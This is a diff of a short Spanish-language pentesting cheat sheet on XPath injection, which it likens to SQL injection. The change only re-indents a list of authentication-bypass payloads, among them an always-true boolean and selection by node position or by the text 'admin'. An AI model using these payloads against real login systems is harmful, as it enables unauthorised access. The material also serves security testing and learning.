@@ -4,18 +4,18 @@ El xpath injection funciona parecido a las SQLI (es como una prima). Posee una s
 
 #### Bypass mediante boolean simple:
 
-  admin' or '1'='1
+    admin' or '1'='1
 
 #### Bypass mediante un true absoluto
 
-  ' or true() or '
+    ' or true() or '
 
 #### Buscar un usuario por index de nodo para el logueo
 
-  ' or position()=2 or '
+    ' or position()=2 or '
 
 #### Bypass buscando un usuario específico:
 
-  ' or contains(.,'admin') or '
+    ' or contains(.,'admin') or '
 
 
